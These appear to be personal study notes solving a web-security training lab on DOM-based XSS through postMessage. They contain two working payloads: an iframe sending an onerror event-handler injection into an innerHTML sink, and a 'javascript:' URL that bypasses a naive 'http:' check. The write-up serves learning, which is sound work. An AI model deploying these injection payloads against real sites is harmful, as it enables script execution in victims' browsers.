# [DOM Vuln] Lab: DOM XSS using web messages (1)

---

![Untitled](%5BDOM%20Vuln%5D%20Lab%20DOM%20XSS%20using%20web%20messages%20(1)%2046b9775cd11b41018147c55dad8c4c14/Untitled.png)

![Untitled](%5BDOM%20Vuln%5D%20Lab%20DOM%20XSS%20using%20web%20messages%20(1)%2046b9775cd11b41018147c55dad8c4c14/Untitled%201.png)

so if we craft a web message as such: 

![Untitled](%5BDOM%20Vuln%5D%20Lab%20DOM%20XSS%20using%20web%20messages%20(1)%2046b9775cd11b41018147c55dad8c4c14/Untitled%202.png)

![Untitled](%5BDOM%20Vuln%5D%20Lab%20DOM%20XSS%20using%20web%20messages%20(1)%2046b9775cd11b41018147c55dad8c4c14/Untitled%203.png)

now lets cause a error within our message that we’re send and since the application is using inner.html we cannot use <script> and other tags but we can cause and error with an event handler and have it pop up a print function as such: 

![Untitled](%5BDOM%20Vuln%5D%20Lab%20DOM%20XSS%20using%20web%20messages%20(1)%2046b9775cd11b41018147c55dad8c4c14/Untitled%204.png)

```jsx
<style>
        body, html {
            height: 100%;
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>

<iframe src="https://0aae001f041662b8829e107300a90010.web-security-academy.net/" onload="this.contentWindow.postMessage('<audio src/onerror=print()>!','https://0aae001f041662b8829e107300a90010.web-security-academy.net/')">
```

the style is not required I used it to make it the size of the entire screen/webpage… 

![Untitled](%5BDOM%20Vuln%5D%20Lab%20DOM%20XSS%20using%20web%20messages%20(1)%2046b9775cd11b41018147c55dad8c4c14/Untitled%205.png)

and there we have it lab solved. 

some important takes aways from this is the source was within the post message and the sink was within the actual innerHTML tag due to **its inability to determine whether or not the injected code could be malicious**. 

The `innerHTML` property sets or returns the HTML content (inner HTML) of an element.

we need to use a Iframe 

![Untitled](%5BDOM%20Vuln%5D%20Lab%20DOM%20XSS%20using%20web%20messages%20(1)%2046b9775cd11b41018147c55dad8c4c14/Untitled%206.png)

since we have no way to communicate with the parent window and the child window that we’re opening. 

```jsx
<iframe id="myIframe" src="https://0ad400190369e70c80794900007e00cf.web-security-academy.net/"></iframe>

<script>
var iframe = document.getElementById('myIframe');

iframe.onload = function() {
  // Send a message to the iframe's content window
  iframe.contentWindow.postMessage("javascript:print(1)//http:", "https://0ad400190369e70c80794900007e00cf.web-security-academy.net/");
};
</script>
```

this is because the parser is only checking for the occurrence of HTTP: and doesn't check where it occurs. so by using the // to escape the white space we can have href run our javascript code by using the javascript protocol. 

![Untitled](%5BDOM%20Vuln%5D%20Lab%20DOM%20XSS%20using%20web%20messages%20(1)%2046b9775cd11b41018147c55dad8c4c14/Untitled%207.png)